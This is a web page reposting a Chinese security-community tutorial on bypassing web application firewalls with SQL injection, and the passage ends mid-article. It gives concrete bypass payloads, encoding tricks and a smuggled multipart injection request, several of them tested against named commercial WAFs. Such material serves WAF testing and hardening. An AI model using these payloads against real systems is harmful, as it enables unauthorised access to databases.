<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />	
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<title>我的WafBypass之道（SQL注入篇） - SecPulse.COM | 安全脉搏</title>
<meta name="description" content="【本文转自安全脉搏战略合作伙伴先知技术社区 原帖地址  安全脉搏编辑huan9740整理发布】" />
<meta name="keywords" content="bypass,Bypass Payload,emoji,HTTP Parameter Pollution,HTTP参数污染,Mysql,Sql注入,Tr3jer_CongRong,WAF绕过,云盾,云锁,先知技术,利用注释简单绕过云锁,我的WafBypass之道,正则逃逸,正则逃逸大法,漏洞研究,腾讯云安全" />

<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/sec/style.css?ver=2014.9.21' type='text/css' media='all' />
<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/font-awesome.min.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.min.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.fancybox.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.mousewheel-3.0.6.pack.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/owl.carousel.min.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/custom.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/comments-ajax.js?ver=1.3'></script>
<link rel='canonical' href='https://www.secpulse.com/archives/53328.html' />
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


</head>
<body class="single single-post postid-53328 single-format-standard">
	<header id="header" class="header clr">
		<div class="header-top inner clr">
	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
	</h4>
	</hgroup>

<div class="login xs-hidden">
				<div class="logindiv">
					<div class="img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="36" height="36" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" /></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i
						class="fa fa-caret-down fa-2"></i>
					<ul class="login-links">
						<li class="log"><a
							href="https://www.secpulse.com/wp-login.php"
							target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
						<li class="exit"><a
							href="https://www.secpulse.com/wp-login.php?action=register"><i
								class="fa fa-user-times"></i><span>注册</span></a></li>
					</ul>
	
  </div>
			</div>
			<div class="top-search xs-hidden">
  <form id="search" method="get" action="https://www.secpulse.com" >
	<input type="text" name="s" id="s" autocomplete="off"  placeholder="输入搜索内容">
	<button class="btn-search"> <i class="fa fa-search"></i></button>
</form></div>
			<div class="menu-button">
				<i class="fa fa-bars fa-3x"></i>
			</div>
		</div>


		<div class="main-nav  xs-hidden">
			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com">安全服务</a></li>
<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com">安全导航</a></li>
<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com">多因素</a></li>
</ul></nav></div>
		</div>
		<div class="nav-bg"></div>
   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>     </header><section class="xs-main index-main clr">
<div class="inner">
<div class="xs-left">
<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/articles">文章</a> &gt; <a href="https://www.secpulse.com/archives/category/articles/web" rel="category tag">Web安全</a> &gt;  正文 </nav><article id="post-53328" class="post-53328 post type-post status-publish format-standard hentry category-web tag-bypass tag-bypass-payload tag-emoji tag-http-parameter-pollution tag-http tag-Mysql tag-sql tag-tr3jer_congrong tag-waf tag-62422 tag-42663 tag-63012 tag-63018 tag-wafbypass tag-63014 tag-63021 tag-63017 tag-63015">
	<header class="single-header">
		<h1>我的WafBypass之道（SQL注入篇）</h1>
			<div class="single-meta">
				
		    <div class="time"><i></i> <a href="javascript:void(0);">2016 /11/23 16:16</a></div>
			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">6,928</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/53328.html#comments">评论 3 条</a></div>
			
			
		</div>
		<!-- .entry-meta -->
	</header>
	<!-- .single-header -->

	<div class="single-main">
		<p>【本文转自<a href="https://www.secpulse.com/archives/53328.html" target="_blank">安全脉搏战略合作伙伴</a><a href="https://xianzhi.aliyun.com/" target="_blank">先知技术社区</a> <a href="https://xianzhi.aliyun.com/forum/read/349.html" target="_blank">原帖地址</a>  安全脉搏编辑<a href="https://www.secpulse.com/archives/author/huan9740" target="_blank">huan9740</a>整理发布】</p>
<h2>0x00 前言</h2>
<p>去年到现在就一直有人希望我出一篇关于<a href="https://www.secpulse.com/archives/tag/waf绕过" target="_blank">waf绕过</a>的文章，我觉得这种老生常 谈的话题也没什么可写的。</p>
<p>很多人一遇到waf就发懵，不知如何是好，能搜到的各 种姿势也是然并卵。</p>
<p><span style="color: #008000">但是积累姿势的过程也是迭代的，那么就有了此文，用来总 结一些学习和培养突破waf的思想。</span></p>
<p><span style="color: #008000">可能总结的并不全，但目的并不是讲那些网上 搜来一大把的东西，So…并不会告诉大家现有的姿势，</span></p>
<p><span style="color: #008000">而是突破Waf Bypass思维定势达到独立去挖掘waf的设计缺陷和如何实现自动化的Waf Bypass（这里只讲主流 waf的黑盒测试）</span></p>
<h2>0x01 搞起</h2>
<p>当我们遇到一个waf时，要确定是什么类型的？先来看看主流的这些waf，狗、盾、神、锁、宝、卫士等等。。。（在测试时不要只在官网测试，因为存在版本差异导致规则库并不一致）</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_9404c303c609e1f.jpg" alt="" width="700" height="400" /></p>
<ul>云waf</ul>
<p>在配置云waf时（通常是CDN包含的waf），DNS需要解析到CDN的ip上去，在请求uri时，数据包就会先经过云waf进行检测，如果通过再将数据包流给主机。</p>
<ul>主机防护软件</ul>
<p>在主机上预先安装了这种防护软件，可用于扫描和保护主机（废话），和监听web端口的流量是否有恶意的，所以这种从功能上讲较为全面。这里再插一嘴，mod_security、ngx-lua-waf这类开源waf虽然看起来不错，但是有个弱点就是升级的成本会高一些。</p>
<ul>硬件ips/ids防护、硬件waf（这里先不讲）</ul>
<p>使用专门硬件防护设备的方式，当向主机请求时，会先将流量经过此设备进行流量清洗和拦截，如果通过再将数据包流给主机。</p>
<p>再来说明下某些潜规则（关系）：</p>
<p>百度云加速免费版节点基于CloudFlare</p>
<p>安全宝和百度云加速规则库相似</p>
<p>创宇云安全和腾讯云安全规则库相似</p>
<p>腾讯云安全和门神规则库相似</p>
<p>硬件waf自身漏洞往往一大堆</p>
<p>当Rule相似时，会导致一个问题，就比如和双胞胎结婚晓得吧？嗯。</p>
<h2>0x02 司空见惯</h2>
<p>我们还需要把各种特性都记牢，在运用时加以变化会很有效果。</p>
<ul>数据库特性</ul>
<pre><code>
注释：
#

-- 

-- - 

--+ 

// 

/**/ 
/*letmetest*/ 
;
</code></pre>
<p><a href="https://www.secpulse.com/archives/tag/利用注释简单绕过云锁" target="_blank">利用注释简单绕过云锁</a>的一个案例：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_0cea6b3a3fa2a73.png" alt="" /></p>
<p>拦截的，但/**/ &gt; 1个就可以绕过了，也就是/**//**/以上都可以。</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_ae542018a2dee6c.png" alt="" /></p>
<p>科学记数法：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_dd41786b0361705.png" alt="" /></p>
<p>空白字符：</p>
<pre><code>
    SQLite3 0A 0D 0C 09 20
    MySQL5 09 0A 0B 0C 0D A0 20
    PosgresSQL 0A 0D 0C 09 20
    Oracle 11g 00 0A 0D 0C 09 20
    MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
</code></pre>
<p>+号:</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_ea8efcbff832509.jpg" alt="" /></p>
<p>-号:</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_fa425a42fb5220f.jpg" alt="" /></p>
<p>``符号：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_e1664d9e5d4c90c.jpg" alt="" /></p>
<p>~号：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_d1d249990ef68ce.jpg" alt="" /></p>
<p>!号：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_c67b7f6cd14e0f4.jpg" alt="" /></p>
<p>@`形式`：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_c0038f3ac53df39.jpg" alt="" /></p>
<p>点号.1：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_e5f2c3a14448842.png" alt="" /></p>
<p>单引号双引号：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_1496c4d76caba6a.png" alt="" /></p>
<p>括号select(1)：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_88cd45e2c149866.jpg" alt="" /></p>
<p>试试union(select)云盾会不会拦截</p>
<p>花括号：</p>
<p>这里举一个云盾的案例，并附上当时fuzz的过程：</p>
<pre><code>    
    union+select 拦截
    select+from 不拦截
    select+from+表名 拦截
    union(select) 不拦截
    所以可以不用在乎这个union了。
    union(select user from ddd) 拦截
    union(select%0aall) 不拦截
    union(select%0aall user from ddd) 拦截
    fuzz下select%0aall与字段之间 + 字段与from之间 + from与表名之间 + 表名与末尾圆括号之间可插入的符号。
    union(select%0aall{user}from{ddd}) 不拦截。
</code></pre>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_421442180cb47d4.png" alt="" /></p>
<p>Bypass Payload：</p>
<pre><code>
    1 union(select%0aall{x users}from{x ddd})
    1 union(select%0adistinct{x users}from{x ddd})
    1 union(select%0adistinctrow{x users}from{x ddd})
</code></pre>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_604fb078ea79554.png" alt="" /></p>
<p>可运用的sql函数&amp;关键字：</p>
<pre><code>
    MySQL：
    union distinct
    union distinctrow
    procedure analyse()
    updatexml()
    extracavalue()
    exp()
    ceil()
    atan()
    sqrt()
    floor()
    ceiling()
    tan()
    rand()
    sign()
    greatest()
    字符串截取函数
    Mid(version(),1,1)
    Substr(version(),1,1)
    Substring(version(),1,1)
    Lpad(version(),1,1)
    Rpad(version(),1,1)
    Left(version(),1)
    reverse(right(reverse(version()),1)
    字符串连接函数
    concat(version(),'|',user());
    concat_ws('|',1,2,3)
    字符转换
    Char(49)
    Hex('a')
    Unhex(61)
    过滤了逗号
    (1)limit处的逗号：
    limit 1 offset 0
    (2)字符串截取处的逗号
    mid处的逗号：
    mid(version() from 1 for 1)
    MSSQL：
    IS_SRVROLEMEMBER()
    IS_MEMBER()
    HAS_DBACCESS()
    convert()
    col_name()
    object_id()
    is_srvrolemember()
    is_member()
    字符串截取函数
    Substring(@@version,1,1)
    Left(@@version,1)
    Right(@@version,1)
    (2)字符串转换函数
    Ascii('a') 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass
    Char('97')
    exec
</code></pre>
<p>Mysql BIGINT数据类型构造溢出型报错注入：<span style="color: #ff0000"><strong> BIGINT Overflow Error Based SQL Injection</strong></span> <a href="http://www.thinkings.org/2015/08/10/bigint-overflow-error-sqli.html" target="_blank">http://www.thinkings.org/2015/08/10/bigint-overflow-error-sqli.html</a></p>
<ul>容器特性</ul>
<p>%特性：</p>
<p>asp+iis的环境中，当我们请求的url中存在单一的百分号%时，iis+asp会将其忽略掉，而没特殊要求的waf当然是不会的：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_abc73b71e9158e3.png" alt="" /></p>
<p>修复方式应该就是检测这种百分号%的周围是否能拼凑成恶意的关键字吧。</p>
<p>%u特性：</p>
<p>iis支持unicode的解析，当我们请求的url存在unicode字符串的话iis会自动将其转换，但waf就不一定了：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_d48a41375f25fba.png" alt="" /></p>
<p>修复过后：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_ea191e995406fcf.png" alt="" /></p>
<p>这个特性还存在另一个case，就是多个widechar会有可能转换为同一个字符。</p>
<pre>    
    s%u0065lect-&gt;select
    s%u00f0lect-&gt;select
</pre>
<p>WAF对%u0065会识别出这是e，组合成了select关键字，但有可能识别不出%u00f0</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_06c12602daca467.png" alt="" /></p>
<p>其实不止这个，还有很多类似的：</p>
<pre>    字母a：
    %u0000
    %u0041
    %u0061
    %u00aa
    %u00e2
    单引号：
    %u0027
    %u02b9
    %u02bc
    %u02c8
    %u2032
    %uff07
    %c0%27
    %c0%a7
    %e0%80%a7
    空白：
    %u0020
    %uff00
    %c0%20
    %c0%a0
    %e0%80%a0
    左括号(：
    %u0028
    %uff08
    %c0%28
    %c0%a8
    %e0%80%a8
    右括号)：
    %u0029
    %uff09
    %c0%29
    %c0%a9
    %e0%80%a9
</pre>
<p>畸形协议&amp;请求：</p>
<p>asp/asp.net：<br />
还有asp/asp.net在解析请求的时候，允许application/x-www-form-urlencoded的数据提交方式，不管是GET还是POST，都可正常接收，过滤GET请求时如果没有对application/x-www-form-urlencoded提交数据方式进行过滤，就会导致任意注入。</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_a906bb9182568bd.png" alt="" /><br />
<img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_a906bb9182568bd.png" alt="" /></p>
<p>php+Apache：</p>
<p>waf通常会对请求进行严格的协议判断，比如GET、POST等，但是apache解析协议时却没有那么严格，当我们将协议随便定义时也是可以的：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_cf818911f2c0924.png" alt="" /></p>
<p>PHP解析器在解析multipart请求的时候，它以逗号作为边界，只取boundary，而普通解析器接受整个字符串。 因此，如果没有按正确规范的话，就会出现这么一个状况：首先填充无害的data，waf将其视为了一个整体请求，其实还包含着恶意语句。</p>
<pre>    ------,xxxx
    Content-Disposition: form-data; name="img"; filename="img.gif"
    GIF89a
    ------
    Content-Disposition: form-data; name="id"
    1' union select null,null,flag,null from flag limit 1 offset 1-- -
    --------
    ------,xxxx--
</pre>
<ul>通用的特性：</ul>
<p>HPP：</p>
<p>HPP是指<a href="https://www.secpulse.com/archives/tag/HTTP参数污染" target="_blank">HTTP参数污染</a>-HTTP Parameter Pollution。当查询字符串多次出现同一个key时，根据容器不同会得到不同的结果。<br />
假设提交的参数即为：id=1&amp;id=2&amp;id=3</p>
<pre>    Asp.net + iis：id=1,2,3
    Asp + iis：id=1,2,3
    Php + apache：id=3
</pre>
<p>双重编码：</p>
<p>这个要视场景而定，如果确定一个带有waf的site存在解码后注入的漏洞的话，会有效避过waf。</p>
<pre>    unlencode
    base64
    json
    binary
    querystring
    htmlencode
    unicode
    php serialize
</pre>
<p>我们在整体测试一个waf时，可测试的点都有哪些？</p>
<p>GET、POST、HEADER那么我们专门针对一个waf进行测试的时候就要将这几个点全测试个遍，header中还包括Cookie、X-Forwarded-For等，往往除了GET以外其他都是过滤最弱的。</p>
<h2>0x03 见招拆招</h2>
<p>“<a href="https://www.secpulse.com/archives/tag/正则逃逸大法" target="_blank">正则逃逸大法</a>”：或许大家没听说过这个名词，因为是我起的。我发现很多waf在进行过滤新姿势的时候很是一根筋，最简单的比方，过滤了%23%0a却不过滤%2d%2d%0a？上面提到八成的waf都被%23%0a所绕过。</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_0115672f38fbad1.png" alt="" /><br />
<img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_a4a7b92089b2847.png" alt="" /><br />
<img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_cd1ef7b67de2e06.png" alt="" /></p>
<p>科学计数法1union、1from？多次被坑的安全宝&amp;百度云加速&amp;Imperva：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_9c0379b2523e1b6.png" alt="" /><br />
<img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_9df4d4ed0f2cfc3.png" alt="" /></p>
<p>过滤了union+select+from，那我select+from+union呢？使用Mysql自定义变量的特性就可以实现，这里举一个阿里云盾的案例：</p>
